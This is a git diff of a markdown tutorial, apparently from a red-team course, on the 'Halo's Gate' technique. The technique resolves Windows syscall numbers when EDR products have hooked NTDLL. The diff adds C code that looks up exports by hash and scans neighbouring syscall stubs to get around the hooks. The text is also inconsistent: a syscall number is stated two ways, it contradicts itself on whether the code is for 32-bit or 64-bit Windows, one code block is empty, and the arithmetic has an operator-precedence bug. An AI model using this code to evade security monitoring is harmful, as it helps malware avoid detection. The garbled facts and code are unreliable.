@@ -1220,6 +1220,8 @@ System calls in NTDLL are arranged in linear, sequential order in memory. When a
 
 ## Practical Demonstration
 
+[01.Unhooks/04.HalosGate](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/04.HalosGate)
+
 ### Step 1: Analyzing Hooked NTDLL in Notepad
 
 Let's start by examining a real-world scenario with hooked NTDLL:
@@ -1249,10 +1251,15 @@ NtCreateThreadEx:      HOOKED (starts with E9 jump)
 The syscalls follow a predictable sequential pattern:
 
 ```
-ZwCreateThread (hooked)      - should be 0x4E
+NtCreateThreadEx (hooked)    - should be 0x4E
 NtCreateProcessEx (hooked)   - should be 0x4D  
-4C: 'L' (clean)              - actual 0x4C
+NtIsProcessInJob (clean)     - actual 0x4F
+NtProtectVirtualMemory       - actual 0x50
 ```
+
+<img width="1610" height="441" alt="image" src="https://github.com/user-attachments/assets/039a9fa0-1083-48ab-b246-d6c60a309a55" />
+<img width="1611" height="462" alt="image" src="https://github.com/user-attachments/assets/49ce93af-906f-4180-8611-2bc6abd53ec2" />
+
 
 If we know that `NtIsProcessInJob` at +64 bytes has syscall number `0x4F`, and our target `NtCreateThreadEx` is 2 positions away, we can calculate:
 - `NtCreateThreadEx` syscall = `0x4F - 2 = 0x4D`
@@ -1265,36 +1272,53 @@ The technique relies on two critical facts:
 
 ## Implementation Architecture
 
+ <img width="369" height="345" alt="image" src="https://github.com/user-attachments/assets/f76d5bfe-23f0-461f-93b6-79323a246cf6" />
+
 ### Modified Resolution Algorithm
 
-Halo's Gate modifies the `get_vx_table_entry` function from Hell's Gate with a sophisticated neighbor-search algorithm.
+HalosGate `main.c` modifies the `GetVxTableEntry` function from Hell's Gate with a sophisticated neighbor-search algorithm.
+
+<img width="1606" height="803" alt="image" src="https://github.com/user-attachments/assets/8d096ded-297a-40c6-b5dc-609321c55641" />
+
 
 ### Core Search Logic
+
+```c
+// First opcodes should be :
+//    MOV R10, RCX
+//    MOV RAX, <syscall>
+if (*((PBYTE)pFunctionAddress) == 0x4c
+    && *((PBYTE)pFunctionAddress + 1) == 0x8b
+    && *((PBYTE)pFunctionAddress + 2) == 0xd1
+    && *((PBYTE)pFunctionAddress + 3) == 0xb8
+    && *((PBYTE)pFunctionAddress + 6) == 0x00
+    && *((PBYTE)pFunctionAddress + 7) == 0x00) {
+
+    BYTE high = *((PBYTE)pFunctionAddress + 5);
+    BYTE low = *((PBYTE)pFunctionAddress + 4);
+    pVxTableEntry->wSystemCall = (high << 8) | low;
+    
+    return TRUE;
+}
+```
 
 When a function is found to be hooked (starts with `0xE9` jump instruction), the algorithm:
 
 1. **Starts with nearest neighbors** (+32 bytes and -32 bytes)
-2. **Expands search radius** incrementally if neighbors are also hooked
-3. **Calculates target syscall** once a clean neighbor is found
+   ```batch
+   # Down and up are defined here:
+   ```
+   
+   <img width="1611" height="194" alt="image" src="https://github.com/user-attachments/assets/34ca195b-a112-4c5a-9623-9633de9579f6" />
 
-```c
-// Pseudo-code for the neighbor search
-for (int distance = 1; distance < MAX_DISTANCE; distance++) {
-    // Check downward neighbor
-    PVOID down_neighbor = target_address + (distance * 32);
-    if (is_clean_syscall(down_neighbor)) {
-        target_syscall = neighbor_syscall - distance;
-        break;
-    }
-    
-    // Check upward neighbor  
-    PVOID up_neighbor = target_address - (distance * 32);
-    if (is_clean_syscall(up_neighbor)) {
-        target_syscall = neighbor_syscall + distance;
-        break;
-    }
-}
-```
+	32 means that the whole sys call stub is 32 bytes, this is true for 64 bit windows 10. For 32 bit, these stubs are 16 bytes.
+   
+   <img width="1610" height="609" alt="image" src="https://github.com/user-attachments/assets/4f231a5f-c636-4204-866e-7be388b55a32" />
+
+   This implementation works only on 32 bit windows 10. 
+ 
+3. **Expands search radius** incrementally if neighbors are also hooked
+4. **Calculates target syscall** once a clean neighbor is found
 
 ## Step-by-Step Technical Process
 
@@ -1312,15 +1336,11 @@ The process begins identically to Hell's Gate:
 When examining the target function:
 
 ```c
-BOOL IsFunctionHooked(PVOID pFunction) {
-    PBYTE pBytes = (PBYTE)pFunction;
-    
-    // Check for jump instruction (0xE9) indicating hook
-    if (pBytes[0] == 0xE9) {
-        return TRUE;
+if (first_byte == 0xe9) {  // HOOK DETECTED!
+    // Then search neighborhood for clean syscall
+    for (idx = 1; idx <= 500; idx++) {
+        // Search UP and DOWN for the clean syscall pattern
     }
-    
-    return FALSE;
 }
 ```
 
@@ -1336,6 +1356,20 @@ Distance 3: Target + 96 bytes, Target - 96 bytes
 ... up to maximum search distance (typically 10)
 ```
 
+```c
+for (WORD idx = 1; idx <= 500; idx++) {
+    // check neighboring syscall DOWN (idx * DOWN = -32 * idx)
+    if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
+        && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
+        // ... pattern check ...
+    
+    // check neighboring syscall UP (idx * UP = +32 * idx)  
+    if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
+        && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
+        // ... pattern check ...
+}
+```
+
 ### Step 4: Syscall Number Calculation
 
 Once a clean neighbor is found:
@@ -1348,14 +1382,44 @@ Once a clean neighbor is found:
 ### Modified GetVxTableEntry Function
 
 ```c
-BOOL GetVxTableEntry(PVOID pDllBase, PIMAGE_EXPORT_DIRECTORY pExportDir, PVX_TABLE_ENTRY pVxEntry) {
-    // ... standard Hell's Gate resolution code ...
-    
-    // Halo's Gate modification: Handle hooks
-    if (!ExtractSyscallNumber(pVxEntry->pAddress, &pVxEntry->wSystemCall)) {
-        // If direct extraction fails, search neighbors
-        if (!FindSyscallViaNeighbors(pVxEntry)) {
-            return FALSE;  // Could not resolve syscall
+BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
+    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
+    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
+    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
+
+    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
+        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
+        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
+
+        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
+            pVxTableEntry->pAddress = pFunctionAddress;
+
+            // CORE SEARCH: Check for clean syscall at target address
+            if (*((PBYTE)pFunctionAddress) == 0x4c
+                && *((PBYTE)pFunctionAddress + 1) == 0x8b
+                && *((PBYTE)pFunctionAddress + 2) == 0xd1
+                && *((PBYTE)pFunctionAddress + 3) == 0xb8
+                && *((PBYTE)pFunctionAddress + 6) == 0x00
+                && *((PBYTE)pFunctionAddress + 7) == 0x00) {
+                // Extract syscall number
+                return TRUE;
+            }
+
+            // MODIFICATION: Neighbor search for hooked functions
+            if (*((PBYTE)pFunctionAddress) == 0xe9) {
+                for (WORD idx = 1; idx <= 500; idx++) {
+                    // Search DOWN
+                    if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
+                        && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
+                        // ... pattern check ...
+                    
+                    // Search UP  
+                    if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
+                        && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
+                        // ... pattern check ...
+                }
+                return FALSE;
+            }
         }
     }
     return TRUE;
@@ -1365,29 +1429,39 @@ BOOL GetVxTableEntry(PVOID pDllBase, PIMAGE_EXPORT_DIRECTORY pExportDir, PVX_TAB
 ### Neighbor Search Implementation
 
 ```c
-BOOL FindSyscallViaNeighbors(PVX_TABLE_ENTRY pVxEntry) {
-    CONST INT SYSCALL_STUB_SIZE = 32;  // 64-bit Windows 10
-    CONST INT MAX_SEARCH_DISTANCE = 10;
-    
-    for (INT i = 1; i <= MAX_SEARCH_DISTANCE; i++) {
-        // Search downward (higher memory addresses)
-        PVOID pDownNeighbor = (PBYTE)pVxEntry->pAddress + (i * SYSCALL_STUB_SIZE);
-        WORD wNeighborSyscall;
-        
-        if (ExtractSyscallNumber(pDownNeighbor, &wNeighborSyscall)) {
-            pVxEntry->wSystemCall = wNeighborSyscall - i;
+// if hooked check the neighborhood to find clean syscall
+if (*((PBYTE)pFunctionAddress) == 0xe9) {
+
+    for (WORD idx = 1; idx <= 500; idx++) {
+        // check neighboring syscall down
+        if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
+            && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
+            && *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
+            && *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
+            && *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
+            && *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
+            BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
+            BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
+            pVxTableEntry->wSystemCall = (high << 8) | low - idx;
+            
             return TRUE;
         }
-        
-        // Search upward (lower memory addresses)
-        PVOID pUpNeighbor = (PBYTE)pVxEntry->pAddress - (i * SYSCALL_STUB_SIZE);
-        if (ExtractSyscallNumber(pUpNeighbor, &wNeighborSyscall)) {
-            pVxEntry->wSystemCall = wNeighborSyscall + i;
+        // check neighboring syscall up
+        if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
+            && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
+            && *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
+            && *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
+            && *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
+            && *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
+            BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
+            BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
+            pVxTableEntry->wSystemCall = (high << 8) | low + idx;
+            
             return TRUE;
         }
     }
     
-    return FALSE;  // No clean neighbor found within search radius
+    return FALSE;
 }
 ```
 
